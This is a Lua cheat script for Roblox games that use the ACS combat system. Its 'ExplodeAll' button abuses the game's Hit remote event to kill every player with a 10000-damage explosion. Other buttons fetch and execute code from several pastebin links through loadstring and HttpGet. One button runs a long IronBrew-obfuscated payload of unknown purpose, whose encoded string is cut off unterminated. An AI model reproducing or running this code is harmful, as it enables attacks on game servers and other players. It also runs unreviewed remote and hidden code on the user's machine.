-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local MAINGUI = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ExplodeAll = Instance.new("TextButton")
local PabGui15 = Instance.new("TextButton")
local BTW_BABY = Instance.new("TextButton")
local ClickKill = Instance.new("TextButton")
local InfiniteYield = Instance.new("TextButton")
local BalasExplosivas = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local fbigov = Instance.new("TextButton")
local CerrarGui = Instance.new("TextButton")
local Version173 = Instance.new("TextLabel")
local CazaRatasGui = Instance.new("TextButton")
local BulletBoomAllGuns = Instance.new("TextButton")
local TextLabel_3 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MAINGUI.Name = "MAINGUI"
MAINGUI.Parent = ScreenGui
MAINGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MAINGUI.BackgroundTransparency = 0.250
MAINGUI.Position = UDim2.new(0.339862853, 0, 0.259615272, 0)
MAINGUI.Size = UDim2.new(0, 425, 0, 230)

TextLabel.Parent = MAINGUI
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Position = UDim2.new(0, 0, -0.00167229725, 0)
TextLabel.Size = UDim2.new(0, 425, 0, 39)
TextLabel.Font = Enum.Font.Oswald
TextLabel.LineHeight = 1.030
TextLabel.Text = "ACS GUI By: FanDeGalactus2"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 32.000

ExplodeAll.Name = "ExplodeAll"
ExplodeAll.Parent = MAINGUI
ExplodeAll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExplodeAll.Position = UDim2.new(0.014117647, 0, 0.218633533, 0)
ExplodeAll.Size = UDim2.new(0, 113, 0, 42)
ExplodeAll.Font = Enum.Font.SourceSans
ExplodeAll.Text = "ExplodeAll"
ExplodeAll.TextColor3 = Color3.fromRGB(0, 0, 0)
ExplodeAll.TextSize = 20.000
ExplodeAll.MouseButton1Down:connect(function()
	local Settings = {
		["ExplosiveHit"] = true,
		["ExPressure"] = 100,
		["ExpRadius"] = 10,
		["DestroyJointRadiusPercent"] = 100,
		["ExplosionDamage"] = 10000,
	}

	for i,v in pairs(game.Players:GetChildren()) do
		game.ReplicatedStorage.ACS_Engine.Eventos.Hit:FireServer(
			v.Character.Head.Position, 
			v.Character.Head, 
			v.Character.Head.Position, 
			Enum.Material.Plastic, Settings
		)
		print("Killed ".. v.Name)
	end

	print("Done!")
end)

PabGui15.Name = "PabGui15"
PabGui15.Parent = MAINGUI
PabGui15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PabGui15.Position = UDim2.new(0.014117647, 0, 0.460869551, 0)
PabGui15.Size = UDim2.new(0, 113, 0, 42)
PabGui15.Font = Enum.Font.SourceSans
PabGui15.Text = "PabGui1,5"
PabGui15.TextColor3 = Color3.fromRGB(0, 0, 0)
PabGui15.TextSize = 20.000
PabGui15.MouseButton1Down:connect(function()
	local Piolagui = Instance.new("ScreenGui")
	local PiolaGui = Instance.new("Frame")
	local Piola = Instance.new("TextLabel")
	local Gatto = Instance.new("TextLabel")
	local Proximamente = Instance.new("TextLabel")
	local Borrarxd = Instance.new("TextButton")
	local Chalecos = Instance.new("TextButton")
	local Carroso = Instance.new("TextButton")
	local Lugares = Instance.new("TextButton")
	local Esposaybo = Instance.new("TextButton")
	local Actualiza = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local TextLabel_2 = Instance.new("TextLabel")
	local Cerrar = Instance.new("TextButton")


	Piolagui.Name = "Piola gui"
	Piolagui.Parent = game.CoreGui
	Piolagui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	Piolagui.ResetOnSpawn = false

	PiolaGui.Name = "PiolaGui"
	PiolaGui.Parent = Piolagui
	PiolaGui.BackgroundColor3 = Color3.fromRGB(177, 177, 177)
	PiolaGui.BackgroundTransparency = 0.350
	PiolaGui.BorderColor3 = Color3.fromRGB(0, 6, 79)
	PiolaGui.Position = UDim2.new(0.763425171, 0, 0.461100608, 0)
	PiolaGui.Size = UDim2.new(0, 165, 0, 179)
	PiolaGui.ZIndex = 4

	Piola.Name = "Piola"
	Piola.Parent = PiolaGui
	Piola.BackgroundColor3 = Color3.fromRGB(143, 143, 143)
	Piola.Position = UDim2.new(0, 0, -0.00188007031, 0)
	Piola.Size = UDim2.new(0, 165, 0, 32)
	Piola.ZIndex = 2
	Piola.Font = Enum.Font.SourceSansBold
	Piola.Text = "Piola Gui V1,5"
	Piola.TextColor3 = Color3.fromRGB(0, 0, 0)
	Piola.TextSize = 20.000
	Piola.TextWrapped = true

	Gatto.Name = "Gatto"
	Gatto.Parent = PiolaGui
	Gatto.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Gatto.Position = UDim2.new(0.00527313352, 0, 0.869981885, 0)
	Gatto.Size = UDim2.new(0, 164, 0, 23)
	Gatto.ZIndex = 2
	Gatto.Font = Enum.Font.SourceSansBold
	Gatto.Text = "Hecho por Gatto#2006"
	Gatto.TextColor3 = Color3.fromRGB(255, 255, 255)
	Gatto.TextScaled = true
	Gatto.TextSize = 14.000
	Gatto.TextWrapped = true

	Proximamente.Name = "Proximamente"
	Proximamente.Parent = PiolaGui
	Proximamente.BackgroundColor3 = Color3.fromRGB(232, 14, 14)
	Proximamente.BackgroundTransparency = 1.000
	Proximamente.Position = UDim2.new(-0.000787538476, 0, 0.655121863, 0)
	Proximamente.Size = UDim2.new(0, 164, 0, 37)
	Proximamente.ZIndex = 2
	Proximamente.Font = Enum.Font.SourceSansBold
	Proximamente.Text = "Proximamente mas flaco no te quejes"
	Proximamente.TextColor3 = Color3.fromRGB(252, 0, 0)
	Proximamente.TextScaled = true
	Proximamente.TextSize = 14.000
	Proximamente.TextWrapped = true

	Borrarxd.Name = "Borrarxd"
	Borrarxd.Parent = PiolaGui
	Borrarxd.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Borrarxd.Position = UDim2.new(0.896000028, 0, -0.00700000022, 0)
	Borrarxd.Size = UDim2.new(0, 17, 0, 11)
	Borrarxd.ZIndex = 4
	Borrarxd.Font = Enum.Font.SourceSans
	Borrarxd.Text = "X"
	Borrarxd.TextColor3 = Color3.fromRGB(0, 0, 0)
	Borrarxd.TextSize = 14.000

	Chalecos.Name = "Chalecos"
	Chalecos.Parent = PiolaGui
	Chalecos.BackgroundColor3 = Color3.fromRGB(196, 255, 0)
	Chalecos.Position = UDim2.new(0.000363647938, 0, 0.410465717, 0)
	Chalecos.Size = UDim2.new(0, 165, 0, 23)
	Chalecos.ZIndex = 4
	Chalecos.Font = Enum.Font.SourceSansBold
	Chalecos.Text = "Chalecos"
	Chalecos.TextColor3 = Color3.fromRGB(255, 255, 255)
	Chalecos.TextScaled = true
	Chalecos.TextSize = 14.000
	Chalecos.TextWrapped = true

	Carroso.Name = "Carroso"
	Carroso.Parent = PiolaGui
	Carroso.BackgroundColor3 = Color3.fromRGB(22, 1, 255)
	Carroso.Position = UDim2.new(0.000412404537, 0, 0.174674958, 0)
	Carroso.Size = UDim2.new(0, 165, 0, 21)
	Carroso.ZIndex = 5
	Carroso.Font = Enum.Font.SourceSansBold
	Carroso.Text = "Carros TP Gui"
	Carroso.TextColor3 = Color3.fromRGB(255, 255, 255)
	Carroso.TextScaled = true
	Carroso.TextSize = 14.000
	Carroso.TextWrapped = true

	Lugares.Name = "Lugares"
	Lugares.Parent = PiolaGui
	Lugares.BackgroundColor3 = Color3.fromRGB(27, 255, 11)
	Lugares.Position = UDim2.new(0.000363647938, 0, 0.287105232, 0)
	Lugares.Size = UDim2.new(0, 165, 0, 21)
	Lugares.ZIndex = 5
	Lugares.Font = Enum.Font.SourceSansBold
	Lugares.Text = "Lugares TP Gui"
	Lugares.TextColor3 = Color3.fromRGB(255, 255, 255)
	Lugares.TextScaled = true
	Lugares.TextSize = 14.000
	Lugares.TextWrapped = true

	Esposaybo.Name = "Esposaybo"
	Esposaybo.Parent = PiolaGui
	Esposaybo.BackgroundColor3 = Color3.fromRGB(128, 0, 255)
	Esposaybo.Position = UDim2.new(0.000412404537, 0, 0.537803411, 0)
	Esposaybo.Size = UDim2.new(0, 165, 0, 21)
	Esposaybo.ZIndex = 5
	Esposaybo.Font = Enum.Font.SourceSansBold
	Esposaybo.Text = "Esposas y botiquin"
	Esposaybo.TextColor3 = Color3.fromRGB(255, 255, 255)
	Esposaybo.TextScaled = true
	Esposaybo.TextSize = 14.000
	Esposaybo.TextWrapped = true

	Actualiza.Name = "Actualiza"
	Actualiza.Parent = Piolagui
	Actualiza.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Actualiza.Position = UDim2.new(0.371908128, 0, 0.333965838, 0)
	Actualiza.Size = UDim2.new(0, 191, 0, 139)

	TextLabel.Parent = Actualiza
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.Position = UDim2.new(-0.000498027715, 0, 0.160280079, 0)
	TextLabel.Size = UDim2.new(0, 191, 0, 117)
	TextLabel.Font = Enum.Font.SourceSans
	TextLabel.Text = "17/04/21. - ahora podran agarrar esposas y botiquin."
	TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14.000
	TextLabel.TextWrapped = true

	TextLabel_2.Parent = Actualiza
	TextLabel_2.BackgroundColor3 = Color3.fromRGB(93, 93, 93)
	TextLabel_2.Position = UDim2.new(-0.00505521288, 0, -0.00226609479, 0)
	TextLabel_2.Size = UDim2.new(0, 191, 0, 23)
	TextLabel_2.Font = Enum.Font.SourceSans
	TextLabel_2.Text = "-Actualizacion 1,4."
	TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel_2.TextSize = 14.000

	Cerrar.Name = "Cerrar"
	Cerrar.Parent = Actualiza
	Cerrar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Cerrar.BorderSizePixel = 0
	Cerrar.Position = UDim2.new(0.899999976, 0, -0.00499999989, 0)
	Cerrar.Size = UDim2.new(0, 19, 0, 16)
	Cerrar.Font = Enum.Font.SourceSans
	Cerrar.Text = "Ok"
	Cerrar.TextColor3 = Color3.fromRGB(255, 0, 0)
	Cerrar.TextSize = 14.000

	-- Scripts:

	local function HFSGSH_fake_script() 
		local script = Instance.new('LocalScript', PiolaGui)

		local UserInputService = game:GetService("UserInputService")

		local gui = script.Parent

		local dragging
		local dragInput
		local dragStart
		local startPos

		local function update(input)
			local delta = input.Position - dragStart
			gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end

		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		gui.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	end
	coroutine.wrap(HFSGSH_fake_script)()
	local function CKGXFBX_fake_script() 
		local script = Instance.new('LocalScript', Borrarxd)

		script.Parent.MouseButton1Down:Connect(function()
			script.Parent.Parent:Destroy()
		end)
	end
	coroutine.wrap(CKGXFBX_fake_script)()
	local function QOHCJT_fake_script() 
		local script = Instance.new('Script', Chalecos)

		script.Parent.MouseButton1Down:Connect(function()
			loadstring(game:HttpGet("https://pastebin.com/raw/0jM5neJV", true))()
		end)
	end
	coroutine.wrap(QOHCJT_fake_script)()
	local function BDAS_fake_script()
		local script = Instance.new('Script', Carroso)

		script.Parent.MouseButton1Down:Connect(function()
			loadstring(game:HttpGet("https://pastebin.com/raw/JUjAiiqy", true))()
		end)
	end
	coroutine.wrap(BDAS_fake_script)()
	local function QRKAQWB_fake_script() 
		local script = Instance.new('Script', Lugares)

		script.Parent.MouseButton1Down:Connect(function()
			loadstring(game:HttpGet("https://pastebin.com/raw/QBkvrB82", true))()
		end)
	end
	coroutine.wrap(QRKAQWB_fake_script)()
	local function MYHNUM_fake_script() 
		local script = Instance.new('Script', Esposaybo)

		script.Parent.MouseButton1Down:Connect(function()
			loadstring(game:HttpGet("https://pastebin.com/raw/FZX9nJkK", true))()
		end)
	end
	coroutine.wrap(MYHNUM_fake_script)()
	local function NMJAJUB_fake_script() 
		local script = Instance.new('Script', Cerrar)

		script.Parent.MouseButton1Down:Connect(function()
			script.Parent.Parent:Destroy()
		end)
	end
	coroutine.wrap(NMJAJUB_fake_script)()
end)

BTW_BABY.Name = "BTW_BABY"
BTW_BABY.Parent = MAINGUI
BTW_BABY.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BTW_BABY.Position = UDim2.new(0.711928487, 0, 0.218633518, 0)
BTW_BABY.Size = UDim2.new(0, 113, 0, 42)
BTW_BABY.Font = Enum.Font.SourceSans
BTW_BABY.Text = "BTW_BABY"
BTW_BABY.TextColor3 = Color3.fromRGB(0, 0, 0)
BTW_BABY.TextSize = 20.000
BTW_BABY.MouseButton1Down:connect(function()
--[[
IronBrew:tm: obfuscation; Version 2.7.2
]]
	return(function(btwbaby_lIlIIllIllIlIIlI,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_llIlIlllIlIlllIIlIlIl)local btwbaby_llIlIIIl=string.char;local btwbaby_IllIIlllIIIIlIllIl=string.sub;local btwbaby_llIIIlIlllll=table.concat;local btwbaby_IlIlIIllIIlIIIIllIIIIll=math.ldexp;local btwbaby_IlllIIlIIllll=getfenv or function()return _ENV end;local btwbaby_lIIIlIIIIllllIlIllllI=select;local btwbaby_lIIlIlIIlIlIl=unpack or table.unpack;local btwbaby_lIllllllIIllIIlIll=tonumber;local function btwbaby_IIIlIlIIIIlllllIlIlIIlI(btwbaby_lIlIIllIllIlIIlI)local btwbaby_llIIllIll,btwbaby_llllIllI,btwbaby_lIIlIlIIlIlIl="","",{}local btwbaby_IIIllIlIIlI=256;local btwbaby_IIlIllIIlIlIIlIIIl={}for btwbaby_IllIIIllIlIIIIIlIIIllII=0,btwbaby_IIIllIlIIlI-1 do btwbaby_IIlIllIIlIlIIlIIIl[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llIlIIIl(btwbaby_IllIIIllIlIIIIIlIIIllII)end;local btwbaby_IllIIIllIlIIIIIlIIIllII=1;local function btwbaby_lllIllIIlIlIlIllIIIIIIIII()local btwbaby_llIIllIll=btwbaby_lIllllllIIllIIlIll(btwbaby_IllIIlllIIIIlIllIl(btwbaby_lIlIIllIllIlIIlI,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_IllIIIllIlIIIIIlIIIllII),36)btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII+1;local btwbaby_llllIllI=btwbaby_lIllllllIIllIIlIll(btwbaby_IllIIlllIIIIlIllIl(btwbaby_lIlIIllIllIlIIlI,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_IllIIIllIlIIIIIlIIIllII+btwbaby_llIIllIll-1),36)btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII+btwbaby_llIIllIll;return btwbaby_llllIllI end;btwbaby_llIIllIll=btwbaby_llIlIIIl(btwbaby_lllIllIIlIlIlIllIIIIIIIII())btwbaby_lIIlIlIIlIlIl[1]=btwbaby_llIIllIll;while btwbaby_IllIIIllIlIIIIIlIIIllII<#btwbaby_lIlIIllIllIlIIlI do local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_lllIllIIlIlIlIllIIIIIIIII()if btwbaby_IIlIllIIlIlIIlIIIl[btwbaby_IllIIIllIlIIIIIlIIIllII]then btwbaby_llllIllI=btwbaby_IIlIllIIlIlIIlIIIl[btwbaby_IllIIIllIlIIIIIlIIIllII]else btwbaby_llllIllI=btwbaby_llIIllIll..btwbaby_IllIIlllIIIIlIllIl(btwbaby_llIIllIll,1,1)end;btwbaby_IIlIllIIlIlIIlIIIl[btwbaby_IIIllIlIIlI]=btwbaby_llIIllIll..btwbaby_IllIIlllIIIIlIllIl(btwbaby_llllIllI,1,1)btwbaby_lIIlIlIIlIlIl[#btwbaby_lIIlIlIIlIlIl+1],btwbaby_llIIllIll,btwbaby_IIIllIlIIlI=btwbaby_llllIllI,btwbaby_llllIllI,btwbaby_IIIllIlIIlI+1 end;return table.concat(btwbaby_lIIlIlIIlIlIl)end;local btwbaby_lIllllllIIllIIlIll=btwbaby_IIIlIlIIIIlllllIlIlIIlI('1A22S27522U23027522S2191A1N1G151A171122U22V2791A111J22U23127921J171M11111A1Z1H1D22U22P2791Y1M151927I27Q27521C111S1G2141516111822U23227928B28D2121H1G1G1B1A22U22R28M28C1G2121B1S22U22Q27921G1527U1A1G22U22O2791328627I28W2752131B27U27Y28022Y27921Q27B1028C212111C151I1D29K29B2791X1A1H1928V27R1D16181D1A132A127521629F27P279215152AC2842AI23827921215171F131M1B1H1A1029J1829K22F2932792B22B42A7275122AX1921I1Z21222T27927523O1B21022U2362AR2AT2AV2AX2AZ1021C28527C1K29727W171T2BI2BJ22S24422J2772951B1N1D1G29Z28U28227521D1W1D1922E22T25Z24Z23921026R26O25122J2C42C522S22T24B1824R23F25724P24Q2C829C27521J1D1U112CX27524K1M2102DF22S22C1L2BN294275211172CE1I112CZ2AJ2751W2851329E2AA27I28L28A2CD18112AO28722T22F2ED2EE24N2C822W2AR29K29S1M2B81M22F2DK21021D2DJ2CY2192BN28922S1A29F28F28H182DK22S22N2BN2D922S1Y28T29A2E522S21J2AY1M27H21J27F1N2AF22S28N29A29O2752121G1J2AS161T21W2FF2BU2FL2FD2FO2EN2B527828A28Y2DB2DD2F422I2BN23327927T11102CD2F128I22T1121325H25725J1K2552C823J2AR2FX214111928T21811151021W27F2H52GY131B21W2901M1D1N2F42222BN2FQ22S121D1S2FZ2B028P28R28T22T22624524U22J1W1W23S2CW25K2721D24K24122424O2CW2C526C2112BN27K2751Y2HN2F422L2EW27R1C2CD2EA2DE21P2531P1R2511X24J2IA2BJ21W182BN2AQ2751N2AY2B02AH2872FO2901S22T24P24O2JF2JF2I122T21K26N23Z23F23923923P2CW22424921524K1423324I2IY2BJ21M2BN2BJ28K28X28D27S152E81022U2GE2G728D21F2851K1K2GH22U2EI2751K2CD171C2JA29122T21X2602352102ED23R2CW2722512632631D22V2GT2F421P2BN2CX22D22U22X2791I1B182A5112KR2JC26H25225024B25D2222KZ22U22Z2791K18151T2HP102HR28S1A22T25M23923N24B21Q25W23X2JZ27521021N2BN2FD21G2LY2FX2M122U2HK2FO21O2112AB131A28729928127921I1D131C2FP2792J52BU2191W2LL22T1L25U25X24K24021926Z2EH2N52J6102N82GK2F325C24J24Q21N2JO25X2C82G62FE2NL21W2N82F42282HJ2NK2BU2J8112NO2K42DA2NZ2O72OA22S2KN1G2KP2NO22T21G1L27022J2JO24L2CW23U21V2422572L52GT2MY27521G2KO1C2KB2LF2LH2LJ2OJ23P22422R21W25E2LS2C82DP22S21E2P528722U2392LW2ML111M2O72NA28B26Q22J23224Z2532C82LV2KM2PN2PP2F028G28I2P32OZ2Q121W2OD2PL27529S2E81G112M12M32HT24H22C22621W21Y21Y23Q2NJ2DY28I112QF2FY2NL2FM2GY1229A2CH2OF2AM1M2FL2HK1Z2QU1W111N27H2B027F1G2FL2LE2DQ21322A21N1Y1X21N2M12FL2R21K2HE2MX23C2792181B287161B2FX2CD21W1N1C2AY182H528H21W1J29K1F2AC2AE2QB22S2152AY1N112QI1A22D2132AB2AU2BA22S1728T27M2DS2IF22S2352792FM2FO22U2K32F829E2PJ29H22S2MK2LZ2PO1N22V2LD2791M161S151N2SM2CE1022M2232232F42C72C927527M1J2M12F422S2ET2C52302IL2Q72TE1M29M2F42382U42BJ2342BN2NX2M42A528H1M2F423G2UE27923C2102DW2FD2IH27U21J2PO2DU1M2B62752AZ2BZ2ST2EX2LX2LZ2MN2EX21F2SE1N2V42DV279102K32CY22S21W21T2C52BI21U2BP27522M2CZ22S2T622O22F2792VS2BI23A22K2792T021W2212C52F82VT2IZ2752BI2WC2VJ2VT21U2BJ2EI2BI2822VW2792WI22S2WL275172VT23A2342792PF22S2LV2WD27521W2WB2VT2U22W92X227528W22C2X228W2NX2VU2XD2X02762XD2BI2J32BI27Q2T623A2XG2W42XG2VV2BJ2T02XF22S27K27K2DF2T62T627K2X12XD2T62GE2XJ22S28L2T62Y62KL22S2XN2XD2HK2W32XV2792Y22XW2X52Y32XD2Y62LE2XM2XG2YF27527K2F82YJ2YH2XY2YM2Y62LV2T62X92VT2AQ2SI2XD2R22Y22XZ2YC2ZB2WO22S23B2CY2822F429C2R22T32792YY2XG2Z32T628W2WU2YG2T62XU2YK2XI2XG27Q2XT27K2Z82YT2YH2XN2YD2822ZF2C52942ZU2BJ2822WW31032X22W82WR2W02ZS22S2WW2GE2WZ2VK2X2310O2VN2BJ2CX2X82XA22S2XC2ZA2XU2ZA2ZX2VT2XL2ZC2Y02YI2XQ2T122S2Y62Y8311A2X22YB2YD2T62YS2YH2XP311J2YL2ZA2Y92X22YP311522S311I2YU3117311L2YY2ZA2Z02XD2Z32ZX2Z62T631022YM310527529C3108310C2YL312822S2ZK2XG2X6312G31202XG2ZR2XS2XE310P311W311D2XD2ZZ312M31252YK3127312E2ZE2CY310A2ZG310L2CY2T02C421Y2ZM2BJ2PF2TV2C82EX27D1B1K2U12VJ2F72K52FC2831D2UW2UY2PO2V122S2V32BR2WH2BJ2292C52Z2310T312N312C2Y22WD29C2J331032DF310O31422VT2822YD27K310E2ZD2VJ311U310S312H31372792R22OY2R3313M2FL2T82AI2R72R92RB2RD102RF314Q2792OD2RI22S2112RK2RM2RO2RQ2BJ2HK23A224314K2ZC2BI310B31492BI2XT315F2WE2XG2W8310N2VK2VM2WK2ZD21U22B312X315O2WK2VX275315O2792W82WO315Y22S2LE2BI22Q2HK294315K2WP31323135315D22S1X2IF23A2GV312H2Y22VI2YD315I2WE2ZA316O2X5315H2XD311G314F313Z316R2XG2CX2Z93126310331622YM2YQ2YX311V2YK31772ZJ313331732ZD3171312D29C3177282312F2ZD316Z312X317G312X2823177294314E317R316V275316A311V317T317W22S28W31753130317728W317P28W28W31772782TB279318A3181278317P278278317727Q318D275318K318127Q317P27Q31142YD28L318N22S3114317728L317P28L311C2YD2GE314E311C31773160312O2GE2GE31772EI318X319D31812WN2XU2EI2EI31772LE317L319M31813166311V2LE311Q2YD29O317L311Q317729O317P29O29O31772LV317L31A431812WY311V2LV2Z12ZC2AQ317L31AD31772AQ317P2AQ2AQ31772PL318X31AM31812PL317P2PL2PL31772XN317L31AV31812XN317P312731772ZF314E2XN317N2ZF2EX2Y22ZF2ZF28L3145310X312Y2YD2ZF2YB2VL312Y2ZF2GE21W22D31BM3165312Q315Z312Y3121311S2WX312Q2BI2NX31BI22S2SI31BB31BH2ZC2WU312A2YD2T231C92752BP312A2792ZF2BP311O2Z431BV2X22WU2T231C2237311V31BC31812WU23G27931CA22S23H31CW31CD22S23I31D022S31CQ31CZ2C52ZF31CQ31CJ2BI31CE2ZC31D931CR312Y31772WU31D72ZC2T22RW2752YD2BP31DK2YD31CQ23D2CY31DF31DB22S2GV2ZF31BW23E22S23F2DL2X22X131E42ZP31BX21X312Q2T6318H31DE31C331DG2ZF312W31DJ31D42T231DR31D131DK31CG22S31CI31EC311D31E02XG2WU313631C231C427531CS31EJ312Y31DO2752T221S31D431DD31D831ER2YN2XG21Z31C6312Y31CQ2XU31CS31DI31CY31EL22S31DN2ZC31DQ31D431CQ2VM31FB31DA31ET31DZ31E52YH29O2WG2J327K318P31EZ31EH2ZB2YD31C831FN31CC31FC31CF31F131FC31CJ27K2AQ31EV2YH31CN31EF31FI312O31FK31C731FM31F5311931FP31DP31GS2ZC31CQ21V31DV31D531FD2YH31FY31C231BK31GF2ZF315C31C52ZF225312Q27K315C31GK27K22622S22731EF31F031BR31052WU31GA31DO228311931F831GT31FA2BJ31CH31H327K22031CL2YH2W622231FZ29C29O223312Q29C31G531GF31HN31F231GR31GC31CB31F931F431HY31GG31IB31EU31I722S31GM31CP31G731FL31EN311931IW2BP2Z331GY31GX31EQ31FW2J329C31DD31IT31FJ31DH31GR31IW31DM31IK31IW31GZ31H131J4312D31H531GF31H731BR31HA31H822S31HD31J522S31HG31IQ31HJ31BQ31G631J931EI31IH31FN31HV31FQ31IL31EQ31ES31JS31I231GK29C2W622E31FZ28229O2VX2J328231ID312Y31IF31C631G931GX31CX31IY31J231GF31K727528231GJ31KE31IR311931J831GP31JA31KO31HT31GT31EM31IK313W31GT31D631JH31H328231J731GF31GO31HB31CT31KP31F622S22A31JE31FS31LM31LC31CJ28231JK312Y31JM31CS31JO31BR31JR31KV31JT31I328231HJ315U31JY31L231K031KO31II22S31K331GW31CF28W31HZ2Y931HD28231K931KY2W62W22Z329429O22L312Q29431EE31M731LI31F331JC31LK31FC31EP31KT31H329431KX31MP31KZ31EY31IE31G731F331MB31MD31D131GE312Y31KU313231FF31K031FH31IU31JB31FN31KR2VS31LA31KS31NM31CJ29431LF31NM31JZ31LJ31MZ31GV31EO31LP22N31LR31MT31DY31I328W29O22G312Q2XB313231MW31JP31MY31NP31LO31FB31NI28W31N62X731KZ22H31HM31NB31K131L631MC31IK31NG31MH31OD22S31NK31GN31NN31KO22I31OJ31HW22S22J31LP31N231NU31P031NX31DF31NZ31IV31FN2US31P831JF22S2W231FV31H328W31LU31BJ31G731LY31CS31M0318231M231GK28W31HJ21131OS31NZ31NC31K231OX31H131OM22S31ML22C2LE28W21231E32DL31O528W31MN31FZ28W21331QH2Z327829O1W312Q318J31OF31NA31Q531NO31OV31KR31PC31OZ2J327831OO31BG2WU31OR31OG31HO31OU31DL31OW31P831OY31IN31R431P131FG31PG31M831LJ1X31P731K41Y31PB31O631RI31PF31H231PH31QZ31RD1Z31OK31J131PO31IM31JI31BG31PS22S31LW312Y31PV312Y31PX27831JU31QQ22S31HJ21831Q431RM31Q631OV31NE31GD31Q931H327831QC318O22S31QL31SG31QO31E827527Q29O219312Q27Q27829431RA31IG31KO31MZ31R131SQ31CJ27Q31R627Q31R831SK31MX31RC31CX31SO31HX31K631H327Q31P231L131LI31FL31RO31R031IK21A31RS31PP31TE31SP31TT31JP31PI31OV31S031PL31LP31S331PY31DW311A2WG27Q31S731S931H931RM31PX27Q31SF31T031SH22S31SJ31T831KN27531HR31RD31TN31K531N331U231ST318Y31SV31PN31FZ27Q31SY31FZ28L29O21B312Q28L31T631TJ31OH31RY31KQ31S131TP31CJ31BE31I328L31IS31LG31P431UU31N031L731P821431U031S431H328L31RV31LH31U531VH31LL21531S131DS31V431U131VC31O831NL31PT31NZ31SB31HC31WB31UN2Y731UP21631VF31RB31MA31Q731RF31TD31WB31V128L31QL31H631G721731RM21G31WB31WZ31GK2GE29O21H312Q2GE31VE31US31M931VS31TB31VJ31UZ31X831IP2Z32GE31TI31XB31G831VS31ND31Q831OL31H32GE31TS31VQ31RX31P531RP31GW21I31CW2WU31LB2YG31UD2J32GE31W131VR31KZ31MZ31PK31K431PM31UB31VQ31CJ2GE31UH31PU31UK31XH31WJ2GE31Q231WN31T931XO31WQ31K431RG31NI2GE31V12GE31QG31SZ22S2GE31SW31BU31V72Z32EI29O21J312Q2EI31XA31QX31SL31TL31LL31GC31TO31XG2J32EI31R62EI31VP31NY31RM31FL21C31XY31D131Y031NS31R231H231CJ2EI31Y831XW31XD31PJ31W727531CQ31YF31PD31ZL31WC31EF31UI31M231LI31PX2EI31WJ2EI31HJ21D31YQ31UT31KZ31XP31WR31XR320031QB31I32EI2W621E31FZ2LE29O21F312Q2LE31ZD31KL31OT31WP31OV31ZI31UY31NH31H32LE31R62LE31ZP31RL31TU31GR31ZT31TX31P831PA31ZX2BJ31MG31ZZ311A31Q32LE320231ZR31W4311931YC31GW31YE31RT2752LE31YJ31WF31YL2J32LE31WJ2LE31HJ21O320N31XC320P31YT31ME31WS3229320U31GK2LE320X31FZ31A322S21P312Q29O32152ZF31KM322G31UV31CX321A31YV31H329O31R629O321H31RW321X31KO21Q31ZU31FC21R31VX31J3323431U331XV323A320431OV322031O331NS320931Y527529O322631RM31WG31JQ322U31PZ322Q31UP21K322F31XN322H31SN31XQ31IM31NI29O31V129O322P2Z32LV29O21L312Q2LV322W31EG31QY321831RD3232322K2752LV31R62LV323831W231BR31FL323C321M31K421M323G31YG324J323J31ZQ31BL31GQ23A28231EK323N320631H2323R321S2J32LV323V31LI323X31PX2LV31WJ2LV31HJ21N324431SM31UW324831VK325631V12LV324E2752AQ29O14312Q2AQ324L322Y3245325D31RD31TC320S326731XI326331OQ325U31ZG31HU325X31ZK326I31XU325831W331XX325131GW153254320A326I321W321J31TA320531U9323Q3223311D325L31JP325N326G31WJ2AQ31YP31XM325V31TM326N321C31CJ2AQ31V12AQ31Z031FZ2AQ31Z4311D31Z62752PL29O16312Q2PL3269321731YS3219327I31R3327U326H31EG324W31Y92WU321L2YC31GM31DR31CQ2BP326W321P31WA2J32PL3270326S323M31RD323O31N131UA32762PL327831JN3228328631WJ2PL31HJ2WR327F326L31F7328431RH328631V12PL32622ZB29O2VH2J32XN3280324N328P31VI3274324931H32XN31R62XN3289320331KZ2VF326D31IK31VW328J31VY31CJ2XN328N324Y321Y2T231W6329M31W8325H31S52XN328W31LX328Y2ZB31WJ2XN31HJ12326K324O327H320R329N32A1322M31FZ